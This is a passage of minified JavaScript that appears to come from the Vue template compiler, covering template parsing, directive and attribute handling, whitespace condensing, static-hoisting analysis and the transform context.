    if (e && (e.type === "ObjectProperty" || e.type === "ArrayPattern")) {
        let n = t.length;
        for (; n--;) {
            const r = t[n];
            if (r.type === "AssignmentExpression") return !0;
            if (r.type !== "ObjectProperty" && !r.type.endsWith("Pattern")) break
        }
    }
    return !1
}

function h_(e) {
    let t = e.length;
    for (; t--;) {
        const n = e[t];
        if (n.type === "NewExpression") return !0;
        if (n.type !== "MemberExpression") break
    }
    return !1
}

function p_(e, t) {
    for (const n of e.params)
        for (const r of dn(n)) t(r)
}

function hm(e, t) {
    const n = e.type === "SwitchCase" ? e.consequent : e.body;
    for (const r of n)
        if (r.type === "VariableDeclaration") {
            if (r.declare) continue;
            for (const s of r.declarations)
                for (const i of dn(s.id)) t(i)
        } else if (r.type === "FunctionDeclaration" || r.type === "ClassDeclaration") {
        if (r.declare || !r.id) continue;
        t(r.id)
    } else m_(r) ? b_(r, !0, t) : r.type === "SwitchStatement" && g_(r, !0, t)
}

function m_(e) {
    return e.type === "ForOfStatement" || e.type === "ForInStatement" || e.type === "ForStatement"
}

function b_(e, t, n) {
    const r = e.type === "ForStatement" ? e.init : e.left;
    if (r && r.type === "VariableDeclaration" && (r.kind === "var" ? t : !t))
        for (const s of r.declarations)
            for (const i of dn(s.id)) n(i)
}

function g_(e, t, n) {
    for (const r of e.cases) {
        for (const s of r.consequent)
            if (s.type === "VariableDeclaration" && (s.kind === "var" ? t : !t))
                for (const i of s.declarations)
                    for (const o of dn(i.id)) n(o);
        hm(r, n)
    }
}

function dn(e, t = []) {
    switch (e.type) {
        case "Identifier":
            t.push(e);
            break;
        case "MemberExpression":
            let n = e;
            for (; n.type === "MemberExpression";) n = n.object;
            t.push(n);
            break;
        case "ObjectPattern":
            for (const r of e.properties) r.type === "RestElement" ? dn(r.argument, t) : dn(r.value, t);
            break;
        case "ArrayPattern":
            e.elements.forEach(r => {
                r && dn(r, t)
            });
            break;
        case "RestElement":
            dn(e.argument, t);
            break;
        case "AssignmentPattern":
            dn(e.left, t);
            break
    }
    return t
}
const x_ = e => /Function(?:Expression|Declaration)$|Method$/.test(e.type),
    pm = e => e && (e.type === "ObjectProperty" || e.type === "ObjectMethod") && !e.computed,
    y_ = (e, t) => pm(t) && t.key === e,
    mm = ["TSAsExpression", "TSTypeAssertion", "TSNonNullExpression", "TSInstantiationExpression", "TSSatisfiesExpression"];

function bm(e) {
    return mm.includes(e.type) ? bm(e.expression) : e
}
const lt = e => e.type === 4 && e.isStatic;

function lf(e) {
    switch (e) {
        case "Teleport":
        case "teleport":
            return ks;
        case "Suspense":
        case "suspense":
            return jc;
        case "KeepAlive":
        case "keep-alive":
            return eo;
        case "BaseTransition":
        case "base-transition":
            return ef
    }
}
const w_ = /^$|^\d|[^\$\w\xA0-\uFFFF]/,
    zo = e => !w_.test(e),
    uf = /[A-Za-z_$\xA0-\uFFFF]/,
    __ = /[\.\?\w$\xA0-\uFFFF]/,
    E_ = /\s+[.[]\s*|\s*[.[]\s+/g,
    gm = e => e.type === 4 ? e.content : e.loc.source,
    xm = e => {
        const t = gm(e).trim().replace(E_, a => a.trim());
        let n = 0,
            r = [],
            s = 0,
            i = 0,
            o = null;
        for (let a = 0; a < t.length; a++) {
            const c = t.charAt(a);
            switch (n) {
                case 0:
                    if (c === "[") r.push(n), n = 1, s++;
                    else if (c === "(") r.push(n), n = 2, i++;
                    else if (!(a === 0 ? uf : __).test(c)) return !1;
                    break;
                case 1:
                    c === "'" || c === '"' || c === "`" ? (r.push(n), n = 3, o = c) : c === "[" ? s++ : c === "]" && (--s || (n = r.pop()));
                    break;
                case 2:
                    if (c === "'" || c === '"' || c === "`") r.push(n), n = 3, o = c;
                    else if (c === "(") i++;
                    else if (c === ")") {
                        if (a === t.length - 1) return !1;
                        --i || (n = r.pop())
                    }
                    break;
                case 3:
                    c === o && (n = r.pop(), o = null);
                    break
            }
        }
        return !s && !i
    },
    v_ = He,
    ff = xm,
    T_ = /^\s*(?:async\s*)?(?:\([^)]*?\)|[\w$_]+)\s*(?::[^=]+)?=>|^\s*(?:async\s+)?function(?:\s+[\w$]+)?\s*\(/,
    ym = e => T_.test(gm(e)),
    S_ = He,
    wm = ym;

function C_(e, t, n = t.length) {
    return _m({
        offset: e.offset,
        line: e.line,
        column: e.column
    }, t, n)
}

function _m(e, t, n = t.length) {
    let r = 0,
        s = -1;
    for (let i = 0; i < n; i++) t.charCodeAt(i) === 10 && (r++, s = i);
    return e.offset += n, e.line += r, e.column = s === -1 ? e.column + n : n - s, e
}

function I_(e, t) {
    if (!e) throw new Error(t || "unexpected compiler condition")
}

function at(e, t, n = !1) {
    for (let r = 0; r < e.props.length; r++) {
        const s = e.props[r];
        if (s.type === 7 && (n || s.exp) && (re(t) ? s.name === t : t.test(s.name))) return s
    }
}

function qo(e, t, n = !1, r = !1) {
    for (let s = 0; s < e.props.length; s++) {
        const i = e.props[s];
        if (i.type === 6) {
            if (n) continue;
            if (i.name === t && (i.value || r)) return i
        } else if (i.name === "bind" && (i.exp || r) && hr(i.arg, t)) return i
    }
}

function hr(e, t) {
    return !!(e && lt(e) && e.content === t)
}

function Em(e) {
    return e.props.some(t => t.type === 7 && t.name === "bind" && (!t.arg || t.arg.type !== 4 || !t.arg.isStatic))
}

function Ra(e) {
    return e.type === 5 || e.type === 2
}

function Bu(e) {
    return e.type === 7 && e.name === "pre"
}

function df(e) {
    return e.type === 7 && e.name === "slot"
}

function Xs(e) {
    return e.type === 1 && e.tagType === 3
}

function ro(e) {
    return e.type === 1 && e.tagType === 2
}
const A_ = new Set([qs, ci]);

function vm(e, t = []) {
    if (e && !re(e) && e.type === 14) {
        const n = e.callee;
        if (!re(n) && A_.has(n)) return vm(e.arguments[0], t.concat(e))
    }
    return [e, t]
}

function so(e, t, n) {
    let r, s = e.type === 13 ? e.props : e.arguments[2],
        i = [],
        o;
    if (s && !re(s) && s.type === 14) {
        const a = vm(s);
        s = a[0], i = a[1], o = i[i.length - 1]
    }
    if (s == null || re(s)) r = Rt([t]);
    else if (s.type === 14) {
        const a = s.arguments[0];
        !re(a) && a.type === 15 ? yh(t, a) || a.properties.unshift(t) : s.callee === tl ? r = Me(n.helper(to), [Rt([t]), s]) : s.arguments.unshift(Rt([t])), !r && (r = s)
    } else s.type === 15 ? (yh(t, s) || s.properties.unshift(t), r = s) : (r = Me(n.helper(to), [Rt([t]), s]), o && o.callee === ci && (o = i[i.length - 2]));
    e.type === 13 ? o ? o.arguments[0] = r : e.props = r : o ? o.arguments[0] = r : e.arguments[2] = r
}

function yh(e, t) {
    let n = !1;
    if (e.key.type === 4) {
        const r = e.key.content;
        n = t.properties.some(s => s.key.type === 4 && s.key.content === r)
    }
    return n
}

function Ks(e, t) {
    return `_${t}_${e.replace(/[^\w]/g,(n,r)=>n==="-"?"_":e.charCodeAt(r).toString())}`
}

function Wt(e, t) {
    if (!e || Object.keys(t).length === 0) return !1;
    switch (e.type) {
        case 1:
            for (let n = 0; n < e.props.length; n++) {
                const r = e.props[n];
                if (r.type === 7 && (Wt(r.arg, t) || Wt(r.exp, t))) return !0
            }
            return e.children.some(n => Wt(n, t));
        case 11:
            return Wt(e.source, t) ? !0 : e.children.some(n => Wt(n, t));
        case 9:
            return e.branches.some(n => Wt(n, t));
        case 10:
            return Wt(e.condition, t) ? !0 : e.children.some(n => Wt(n, t));
        case 4:
            return !e.isStatic && zo(e.content) && !!t[e.content];
        case 8:
            return e.children.some(n => me(n) && Wt(n, t));
        case 5:
        case 12:
            return Wt(e.content, t);
        case 2:
        case 3:
        case 20:
            return !1;
        default:
            return !1
    }
}

function Tm(e) {
    return e.type === 14 && e.callee === rl ? e.arguments[1].returns : e
}
const Sm = /([\s\S]*?)\s+(?:in|of)\s+(\S[\s\S]*)/;

function hf(e) {
    for (let t = 0; t < e.length; t++)
        if (!Pt(e.charCodeAt(t))) return !1;
    return !0
}

function il(e) {
    return e.type === 2 && hf(e.content) || e.type === 12 && il(e.content)
}

function pf(e) {
    return e.type === 3 || il(e)
}
const Cm = {
    parseMode: "base",
    ns: 0,
    delimiters: ["{{", "}}"],
    getNamespace: () => 0,
    isVoidTag: $r,
    isPreTag: $r,
    isIgnoreNewlineTag: $r,
    isCustomElement: $r,
    onError: cf,
    onWarn: dm,
    comments: !1,
    prefixIdentifiers: !1
};
let be = Cm,
    io = null,
    $n = "",
    Qe = null,
    fe = null,
    mt = "",
    Cn = -1,
    Lr = -1,
    mf = 0,
    dr = !1,
    Lu = null;
const ve = [],
    Ce = new s_(ve, {
        onerr: En,
        ontext(e, t) {
            xa(ze(e, t), e, t)
        },
        ontextentity(e, t, n) {
            xa(e, t, n)
        },
        oninterpolation(e, t) {
            if (dr) return xa(ze(e, t), e, t);
            let n = e + Ce.delimiterOpen.length,
                r = t - Ce.delimiterClose.length;
            for (; Pt($n.charCodeAt(n));) n++;
            for (; Pt($n.charCodeAt(r - 1));) r--;
            let s = ze(n, r);
            s.includes("&") && (s = be.decodeEntities(s, !1)), $u({
                type: 5,
                content: ka(s, !1, Ae(n, r)),
                loc: Ae(e, t)
            })
        },
        onopentagname(e, t) {
            const n = ze(e, t);
            Qe = {
                type: 1,
                tag: n,
                ns: be.getNamespace(n, ve[0], be.ns),
                tagType: 0,
                props: [],
                children: [],
                loc: Ae(e - 1, t),
                codegenNode: void 0
            }
        },
        onopentagend(e) {
            _h(e)
        },
        onclosetag(e, t) {
            const n = ze(e, t);
            if (!be.isVoidTag(n)) {
                let r = !1;
                for (let s = 0; s < ve.length; s++)
                    if (ve[s].tag.toLowerCase() === n.toLowerCase()) {
                        r = !0, s > 0 && En(24, ve[0].loc.start.offset);
                        for (let o = 0; o <= s; o++) {
                            const a = ve.shift();
                            Ma(a, t, o < s)
                        }
                        break
                    } r || En(23, Im(e, 60))
            }
        },
        onselfclosingtag(e) {
            const t = Qe.tag;
            Qe.isSelfClosing = !0, _h(e), ve[0] && ve[0].tag === t && Ma(ve.shift(), e)
        },
        onattribname(e, t) {
            fe = {
                type: 6,
                name: ze(e, t),
                nameLoc: Ae(e, t),
                value: void 0,
                loc: Ae(e)
            }
        },
        ondirname(e, t) {
            const n = ze(e, t),
                r = n === "." || n === ":" ? "bind" : n === "@" ? "on" : n === "#" ? "slot" : n.slice(2);
            if (!dr && r === "" && En(26, e), dr || r === "") fe = {
                type: 6,
                name: n,
                nameLoc: Ae(e, t),
                value: void 0,
                loc: Ae(e)
            };
            else if (fe = {
                    type: 7,
                    name: r,
                    rawName: n,
                    exp: void 0,
                    arg: void 0,
                    modifiers: n === "." ? [oe("prop")] : [],
                    loc: Ae(e)
                }, r === "pre") {
                dr = Ce.inVPre = !0, Lu = Qe;
                const s = Qe.props;
                for (let i = 0; i < s.length; i++) s[i].type === 7 && (s[i] = D_(s[i]))
            }
        },
        ondirarg(e, t) {
            if (e === t) return;
            const n = ze(e, t);
            if (dr && !Bu(fe)) fe.name += n, Dr(fe.nameLoc, t);
            else {
                const r = n[0] !== "[";
                fe.arg = ka(r ? n : n.slice(1, -1), r, Ae(e, t), r ? 3 : 0)
            }
        },
        ondirmodifier(e, t) {
            const n = ze(e, t);
            if (dr && !Bu(fe)) fe.name += "." + n, Dr(fe.nameLoc, t);
            else if (fe.name === "slot") {
                const r = fe.arg;
                r && (r.content += "." + n, Dr(r.loc, t))
            } else {
                const r = oe(n, !0, Ae(e, t));
                fe.modifiers.push(r)
            }
        },
        onattribdata(e, t) {
            mt += ze(e, t), Cn < 0 && (Cn = e), Lr = t
        },
        onattribentity(e, t, n) {
            mt += e, Cn < 0 && (Cn = t), Lr = n
        },
        onattribnameend(e) {
            const t = fe.loc.start.offset,
                n = ze(t, e);
            fe.type === 7 && (fe.rawName = n), Qe.props.some(r => (r.type === 7 ? r.rawName : r.name) === n) && En(2, t)
        },
        onattribend(e, t) {
            if (Qe && fe) {
                if (Dr(fe.loc, t), e !== 0)
                    if (mt.includes("&") && (mt = be.decodeEntities(mt, !0)), fe.type === 6) fe.name === "class" && (mt = Nm(mt).trim()), e === 1 && !mt && En(13, t), fe.value = {
                        type: 2,
                        content: mt,
                        loc: e === 1 ? Ae(Cn, Lr) : Ae(Cn - 1, Lr + 1)
                    }, Ce.inSFCRoot && Qe.tag === "template" && fe.name === "lang" && mt && mt !== "html" && Ce.enterRCDATA(ic("</template"), 0);
                    else {
                        let n = 0;
                        fe.exp = ka(mt, !1, Ae(Cn, Lr), 0, n), fe.name === "for" && (fe.forParseResult = P_(fe.exp));
                        let r = -1;
                        fe.name === "bind" && (r = fe.modifiers.findIndex(s => s.content === "sync")) > -1 && Ws("COMPILER_V_BIND_SYNC", be, fe.loc, fe.arg.loc.source) && (fe.name = "model", fe.modifiers.splice(r, 1))
                    }(fe.type !== 7 || fe.name !== "pre") && Qe.props.push(fe)
            }
            mt = "", Cn = Lr = -1
        },
        oncomment(e, t) {
            be.comments && $u({
                type: 3,
                content: ze(e, t),
                loc: Ae(e - 4, t + 3)
            })
        },
        onend() {
            const e = $n.length;
            for (let t = 0; t < ve.length; t++) Ma(ve[t], e - 1), En(24, ve[t].loc.start.offset)
        },
        oncdata(e, t) {
            ve[0].ns !== 0 ? xa(ze(e, t), e, t) : En(1, e - 9)
        },
        onprocessinginstruction(e) {
            (ve[0] ? ve[0].ns : be.ns) === 0 && En(21, e - 1)
        }
    }),
    wh = /,([^,\}\]]*)(?:,([^,\}\]]*))?$/,
    N_ = /^\(|\)$/g;

function P_(e) {
    const t = e.loc,
        n = e.content,
        r = n.match(Sm);
    if (!r) return;
    const [, s, i] = r, o = (f, d, h = !1) => {
        const b = t.start.offset + d,
            m = b + f.length;
        return ka(f, !1, Ae(b, m), 0, h ? 1 : 0)
    }, a = {
        source: o(i.trim(), n.indexOf(i, s.length)),
        value: void 0,
        key: void 0,
        index: void 0,
        finalized: !1
    };
    let c = s.trim().replace(N_, "").trim();
    const u = s.indexOf(c),
        l = c.match(wh);
    if (l) {
        c = c.replace(wh, "").trim();
        const f = l[1].trim();
        let d;
        if (f && (d = n.indexOf(f, u + c.length), a.key = o(f, d, !0)), l[2]) {
            const h = l[2].trim();
            h && (a.index = o(h, n.indexOf(h, a.key ? d + f.length : u + c.length), !0))
        }
    }
    return c && (a.value = o(c, u, !0)), a
}

function ze(e, t) {
    return $n.slice(e, t)
}

function _h(e) {
    Ce.inSFCRoot && (Qe.innerLoc = Ae(e + 1, e + 1)), $u(Qe);
    const {
        tag: t,
        ns: n
    } = Qe;
    n === 0 && be.isPreTag(t) && mf++, be.isVoidTag(t) ? Ma(Qe, e) : (ve.unshift(Qe), (n === 1 || n === 2) && (Ce.inXML = !0)), Qe = null
}

function xa(e, t, n) {
    {
        const i = ve[0] && ve[0].tag;
        i !== "script" && i !== "style" && e.includes("&") && (e = be.decodeEntities(e, !1))
    }
    const r = ve[0] || io,
        s = r.children[r.children.length - 1];
    s && s.type === 2 ? (s.content += e, Dr(s.loc, n)) : r.children.push({
        type: 2,
        content: e,
        loc: Ae(t, n)
    })
}

function Ma(e, t, n = !1) {
    n ? Dr(e.loc, Im(t, 60)) : Dr(e.loc, O_(t, 62) + 1), Ce.inSFCRoot && (e.children.length ? e.innerLoc.end = ae({}, e.children[e.children.length - 1].loc.end) : e.innerLoc.end = ae({}, e.innerLoc.start), e.innerLoc.source = ze(e.innerLoc.start.offset, e.innerLoc.end.offset));
    const {
        tag: r,
        ns: s,
        children: i
    } = e;
    if (dr || (r === "slot" ? e.tagType = 2 : Eh(e) ? e.tagType = 3 : M_(e) && (e.tagType = 1)), Ce.inRCDATA || (e.children = Am(i)), s === 0 && be.isIgnoreNewlineTag(r)) {
        const o = i[0];
        o && o.type === 2 && (o.content = o.content.replace(/^\r?\n/, ""))
    }
    s === 0 && be.isPreTag(r) && mf--, Lu === e && (dr = Ce.inVPre = !1, Lu = null), Ce.inXML && (ve[0] ? ve[0].ns : be.ns) === 0 && (Ce.inXML = !1);
    {
        const o = e.props;
        if (!Ce.inSFCRoot && Xr("COMPILER_NATIVE_TEMPLATE", be) && e.tag === "template" && !Eh(e)) {
            const c = ve[0] || io,
                u = c.children.indexOf(e);
            c.children.splice(u, 1, ...e.children)
        }
        const a = o.find(c => c.type === 6 && c.name === "inline-template");
        a && Ws("COMPILER_INLINE_TEMPLATE", be, a.loc) && e.children.length && (a.value = {
            type: 2,
            content: ze(e.children[0].loc.start.offset, e.children[e.children.length - 1].loc.end.offset),
            loc: a.loc
        })
    }
}

function O_(e, t) {
    let n = e;
    for (; $n.charCodeAt(n) !== t && n < $n.length - 1;) n++;
    return n
}

function Im(e, t) {
    let n = e;
    for (; $n.charCodeAt(n) !== t && n >= 0;) n--;
    return n
}
const R_ = new Set(["if", "else", "else-if", "for", "slot"]);

function Eh({
    tag: e,
    props: t
}) {
    if (e === "template") {
        for (let n = 0; n < t.length; n++)
            if (t[n].type === 7 && R_.has(t[n].name)) return !0
    }
    return !1
}

function M_({
    tag: e,
    props: t
}) {
    if (be.isCustomElement(e)) return !1;
    if (e === "component" || k_(e.charCodeAt(0)) || lf(e) || be.isBuiltInComponent && be.isBuiltInComponent(e) || be.isNativeTag && !be.isNativeTag(e)) return !0;
    for (let n = 0; n < t.length; n++) {
        const r = t[n];
        if (r.type === 6) {
            if (r.name === "is" && r.value) {
                if (r.value.content.startsWith("vue:")) return !0;
                if (Ws("COMPILER_IS_ON_ELEMENT", be, r.loc)) return !0
            }
        } else if (r.name === "bind" && hr(r.arg, "is") && Ws("COMPILER_IS_ON_ELEMENT", be, r.loc)) return !0
    }
    return !1
}

function k_(e) {
    return e > 64 && e < 91
}
const B_ = /\r\n/g;

function Am(e) {
    const t = be.whitespace !== "preserve";
    let n = !1;
    for (let r = 0; r < e.length; r++) {
        const s = e[r];
        if (s.type === 2)
            if (mf) s.content = s.content.replace(B_, `
`);
            else if (hf(s.content)) {
            const i = e[r - 1] && e[r - 1].type,
                o = e[r + 1] && e[r + 1].type;
            !i || !o || t && (i === 3 && (o === 3 || o === 1) || i === 1 && (o === 3 || o === 1 && L_(s.content))) ? (n = !0, e[r] = null) : s.content = " "
        } else t && (s.content = Nm(s.content))
    }
    return n ? e.filter(Boolean) : e
}

function L_(e) {
    for (let t = 0; t < e.length; t++) {
        const n = e.charCodeAt(t);
        if (n === 10 || n === 13) return !0
    }
    return !1
}

function Nm(e) {
    let t = "",
        n = !1;
    for (let r = 0; r < e.length; r++) Pt(e.charCodeAt(r)) ? n || (t += " ", n = !0) : (t += e[r], n = !1);
    return t
}

function $u(e) {
    (ve[0] || io).children.push(e)
}

function Ae(e, t) {
    return {
        start: Ce.getPos(e),
        end: t == null ? t : Ce.getPos(t),
        source: t == null ? t : ze(e, t)
    }
}

function $_(e) {
    return Ae(e.start.offset, e.end.offset)
}

function Dr(e, t) {
    e.end = Ce.getPos(t), e.source = ze(e.start.offset, t)
}

function D_(e) {
    const t = {
        type: 6,
        name: e.rawName,
        nameLoc: Ae(e.loc.start.offset, e.loc.start.offset + e.rawName.length),
        value: void 0,
        loc: e.loc
    };
    if (e.exp) {
        const n = e.exp.loc;
        n.end.offset < e.loc.end.offset && (n.start.offset--, n.start.column--, n.end.offset++, n.end.column++), t.value = {
            type: 2,
            content: e.exp.content,
            loc: n
        }
    }
    return t
}

function ka(e, t = !1, n, r = 0, s = 0) {
    return oe(e, t, n, r)
}

function En(e, t, n) {
    be.onError(Ee(e, Ae(t, t)))
}

function F_() {
    Ce.reset(), Qe = null, fe = null, mt = "", Cn = -1, Lr = -1, ve.length = 0
}

function bf(e, t) {
    if (F_(), $n = e, be = ae({}, Cm), t) {
        let s;
        for (s in t) t[s] != null && (be[s] = t[s])
    }
    Ce.mode = be.parseMode === "html" ? 1 : be.parseMode === "sfc" ? 2 : 0, Ce.inXML = be.ns === 1 || be.ns === 2;
    const n = t && t.delimiters;
    n && (Ce.delimiterOpen = ic(n[0]), Ce.delimiterClose = ic(n[1]));
    const r = io = lm([], e);
    return Ce.parse($n), r.loc = Ae(0, e.length), r.children = Am(r.children), io = null, r
}

function U_(e, t) {
    Ba(e, void 0, t, !!Pm(e))
}

function Pm(e) {
    const t = e.children.filter(n => n.type !== 3);
    return t.length === 1 && t[0].type === 1 && !ro(t[0]) ? t[0] : null
}

function Ba(e, t, n, r = !1, s = !1) {
    const {
        children: i
    } = e, o = [];
    for (let l = 0; l < i.length; l++) {
        const f = i[l];
        if (f.type === 1 && f.tagType === 0) {
            const d = r ? 0 : yt(f, n);
            if (d > 0) {
                if (d >= 2) {
                    f.codegenNode.patchFlag = -1, o.push(f);
                    continue
                }
            } else {
                const h = f.codegenNode;
                if (h.type === 13) {
                    const b = h.patchFlag;
                    if ((b === void 0 || b === 512 || b === 1) && Rm(f, n) >= 2) {
                        const m = Mm(f);
                        m && (h.props = n.hoist(m))
                    }
                    h.dynamicProps && (h.dynamicProps = n.hoist(h.dynamicProps))
                }
            }
        } else if (f.type === 12 && (r ? 0 : yt(f, n)) >= 2) {
            f.codegenNode.type === 14 && f.codegenNode.arguments.length > 0 && f.codegenNode.arguments.push("-1"), o.push(f);
            continue
        }
        if (f.type === 1) {
            const d = f.tagType === 1;
            d && n.scopes.vSlot++, Ba(f, e, n, !1, s), d && n.scopes.vSlot--
        } else if (f.type === 11) Ba(f, e, n, f.children.length === 1, !0);
        else if (f.type === 9)
            for (let d = 0; d < f.branches.length; d++) Ba(f.branches[d], e, n, f.branches[d].children.length === 1, s)
    }
    let a = !1;
    if (o.length === i.length && e.type === 1) {
        if (e.tagType === 0 && e.codegenNode && e.codegenNode.type === 13 && K(e.codegenNode.children)) e.codegenNode.children = c(br(e.codegenNode.children)), a = !0;
        else if (e.tagType === 1 && e.codegenNode && e.codegenNode.type === 13 && e.codegenNode.children && !K(e.codegenNode.children) && e.codegenNode.children.type === 15) {
            const l = u(e.codegenNode, "default");
            l && (l.returns = c(br(l.returns)), a = !0)
        } else if (e.tagType === 3 && t && t.type === 1 && t.tagType === 1 && t.codegenNode && t.codegenNode.type === 13 && t.codegenNode.children && !K(t.codegenNode.children) && t.codegenNode.children.type === 15) {
            const l = at(e, "slot", !0),
                f = l && l.arg && u(t.codegenNode, l.arg);
            f && (f.returns = c(br(f.returns)), a = !0)
        }
    }
    if (!a)
        for (const l of o) l.codegenNode = n.cache(l.codegenNode);

    function c(l) {
        const f = n.cache(l);
        return f.needArraySpread = !0, f
    }

    function u(l, f) {
        if (l.children && !K(l.children) && l.children.type === 15) {
            const d = l.children.properties.find(h => h.key === f || h.key.content === f);
            return d && d.value
        }
    }
    o.length && n.transformHoist && n.transformHoist(i, n, e)
}

function yt(e, t) {
    const {
        constantCache: n
    } = t;
    switch (e.type) {
        case 1:
            if (e.tagType !== 0) return 0;
            const r = n.get(e);
            if (r !== void 0) return r;
            const s = e.codegenNode;
            if (s.type !== 13 || s.isBlock && e.tag !== "svg" && e.tag !== "foreignObject" && e.tag !== "math") return 0;
            if (s.patchFlag === void 0) {
                let o = 3;
                const a = Rm(e, t);
                if (a === 0) return n.set(e, 0), 0;
                a < o && (o = a);
                for (let c = 0; c < e.children.length; c++) {
                    const u = yt(e.children[c], t);
                    if (u === 0) return n.set(e, 0), 0;
                    u < o && (o = u)
                }
                if (o > 1)
                    for (let c = 0; c < e.props.length; c++) {
                        const u = e.props[c];
                        if (u.type === 7 && u.name === "bind" && u.exp) {
                            const l = yt(u.exp, t);
                            if (l === 0) return n.set(e, 0), 0;
                            l < o && (o = l)
                        }
                    }
                if (s.isBlock) {
                    for (let c = 0; c < e.props.length; c++)
                        if (e.props[c].type === 7) return n.set(e, 0), 0;
                    t.removeHelper(wr), t.removeHelper(rs(t.inSSR, s.isComponent)), s.isBlock = !1, t.helper(ns(t.inSSR, s.isComponent))
                }
                return n.set(e, o), o
            } else return n.set(e, 0), 0;
        case 2:
        case 3:
            return 3;
        case 9:
        case 11:
        case 10:
            return 0;
        case 5:
        case 12:
            return yt(e.content, t);
        case 4:
            return e.constType;
        case 8:
            let i = 3;
            for (let o = 0; o < e.children.length; o++) {
                const a = e.children[o];
                if (re(a) || ft(a)) continue;
                const c = yt(a, t);
                if (c === 0) return 0;
                c < i && (i = c)
            }
            return i;
        case 20:
            return 2;
        default:
            return 0
    }
}
const V_ = new Set([Qc, el, qs, ci]);

function Om(e, t) {
    if (e.type === 14 && !re(e.callee) && V_.has(e.callee)) {
        const n = e.arguments[0];
        if (n.type === 4) return yt(n, t);
        if (n.type === 14) return Om(n, t)
    }
    return 0
}

function Rm(e, t) {
    let n = 3;
    const r = Mm(e);
    if (r && r.type === 15) {
        const {
            properties: s
        } = r;
        for (let i = 0; i < s.length; i++) {
            const {
                key: o,
                value: a
            } = s[i], c = yt(o, t);
            if (c === 0) return c;
            c < n && (n = c);
            let u;
            if (a.type === 4 ? u = yt(a, t) : a.type === 14 ? u = Om(a, t) : u = 0, u === 0) return u;
            u < n && (n = u)
        }
    }
    return n
}

function Mm(e) {
    const t = e.codegenNode;
    if (t.type === 13) return t.props
}

function km(e, {
    filename: t = "",
    prefixIdentifiers: n = !1,
    hoistStatic: r = !1,
    hmr: s = !1,
    cacheHandlers: i = !1,
    nodeTransforms: o = [],
    directiveTransforms: a = {},
    transformHoist: c = null,
    isBuiltInComponent: u = He,
    isCustomElement: l = He,
    expressionPlugins: f = [],
    scopeId: d = null,
    slotted: h = !0,
    ssr: b = !1,
    inSSR: m = !1,
    ssrCssVars: _ = "",
    bindingMetadata: E = ue,
    inline: S = !1,
    isTS: g = !1,
    onError: p = cf,
    onWarn: w = dm,
    compatConfig: A
}) {
    const N = t.replace(/\?.*$/, "").match(/([^/\\]+)\.\w+$/),
        v = {
            filename: t,
            selfName: N && Sr(_e(N[1])),
            prefixIdentifiers: n,
            hoistStatic: r,
            hmr: s,
            cacheHandlers: i,
            nodeTransforms: o,
            directiveTransforms: a,
            transformHoist: c,
            isBuiltInComponent: u,
            isCustomElement: l,
            expressionPlugins: f,
            scopeId: d,
            slotted: h,
            ssr: b,
            inSSR: m,
            ssrCssVars: _,
            bindingMetadata: E,
            inline: S,
            isTS: g,
            onError: p,
            onWarn: w,
            compatConfig: A,
            root: e,
            helpers: new Map,
            components: new Set,
            directives: new Set,
            hoists: [],
            imports: [],
            cached: [],
            constantCache: new WeakMap,
            temps: 0,
            identifiers: Object.create(null),
            scopes: {
                vFor: 0,
                vSlot: 0,
                vPre: 0,
                vOnce: 0
            },
            parent: null,
            grandParent: null,
            currentNode: e,
            childIndex: 0,
            inVOnce: !1,
            helper(y) {
                const x = v.helpers.get(y) || 0;
                return v.helpers.set(y, x + 1), y
            },
            removeHelper(y) {
                const x = v.helpers.get(y);
                if (x) {
                    const I = x - 1;
                    I ? v.helpers.set(y, I) : v.helpers.delete(y)
                }
            },
            helperString(y) {
                return `_${es[v.helper(y)]}`
            },
            replaceNode(y) {
                v.parent.children[v.childIndex] = v.currentNode = y
            },
            removeNode(y) {
                const x = v.parent.children,
                    I = y ? x.indexOf(y) : v.currentNode ? v.childIndex : -1;
                !y || y === v.currentNode ? (v.currentNode = null, v.onNodeRemoved()) : v.childIndex > I && (v.childIndex--, v.onNodeRemoved()), v.parent.children.splice(I, 1)
            },
            onNodeRemoved: He,
            addIdentifiers(y) {},
            removeIdentifiers(y) {},
            hoist(y) {
                re(y) && (y = oe(y)), v.hoists.push(y);
                const x = oe(`_hoisted_${v.hoists.length}`, !1, y.loc, 2);
                return x.hoisted = y, x
            },
            cache(y, x = !1, I = !1) {
                const T = um(v.cached.length, y, x, I);
                return v.cached.push(T), T
            }
        };
    return v.filters = new Set, v
}

function Bm(e, t) {
    const n = km(e, t);
    Go(e, n), t.hoistStatic && U_(e, n), t.ssr || H_(e, n), e.helpers = new Set([...n.helpers.keys()]), e.components = [...n.components], e.directives = [...n.directives], e.imports = n.imports, e.hoists = n.hoists, e.temps = n.temps, e.cached = n.cached, e.transformed = !0, e.filters = [...n.filters]
}

function H_(e, t) {
    const {
        helper: n
    } = t, {
        children: r
    } = e;
    if (r.length === 1) {
        const s = Pm(e);
        if (s && s.codegenNode) {
            const i = s.codegenNode;
            i.type === 13 && sl(i, t), e.codegenNode = i
        } else e.codegenNode = r[0]
    } else if (r.length > 1) {
        let s = 64;
        e.codegenNode = Gs(t, n(zs), void 0, e.children, s, void 0, void 0, !0, void 0, !1)
    }
}

function j_(e, t) {
    let n = 0;
    const r = () => {
        n--
    };
    for (; n < e.children.length; n++) {
        const s = e.children[n];
        re(s) || (t.grandParent = t.parent, t.parent = e, t.childIndex = n, t.onNodeRemoved = r, Go(s, t))
    }
}

function Go(e, t) {
    t.currentNode = e;
    const {
        nodeTransforms: n
    } = t, r = [];
    for (let i = 0; i < n.length; i++) {
        const o = n[i](e, t);
        if (o && (K(o) ? r.push(...o) : r.push(o)), t.currentNode) e = t.currentNode;
        else return
    }
    switch (e.type) {
        case 3:
            t.ssr || t.helper(ai);
            break;
        case 5:
            t.ssr || t.helper(jo);
            break;
        case 9:
            for (let i = 0; i < e.branches.length; i++) Go(e.branches[i], t);
            break;
        case 10:
        case 11:
        case 1:
        case 0:
            j_(e, t);
            break
    }
    t.currentNode = e;
    let s = r.length;
    for (; s--;) r[s]()
}

function gf(e, t) {
    const n = re(e) ? r => r === e : r => e.test(r);
    return (r, s) => {
        if (r.type === 1) {
            const {
                props: i
            } = r;
            if (r.tagType === 3 && i.some(df)) return;
            const o = [];
            for (let a = 0; a < i.length; a++) {
                const c = i[a];
                if (c.type === 7 && n(c.name)) {
                    i.splice(a, 1), a--;
                    const u = t(r, c, s);
                    u && o.push(u)
                }
            }
            return o
        }
    }
}
const ol = "/*@__PURE__*/",
    Lm = e => `${es[e]}: _${es[e]}`;

function z_(e, {
    mode: t = "function",
    prefixIdentifiers: n = t === "module",
    sourceMap: r = !1,
    filename: s = "template.vue.html",
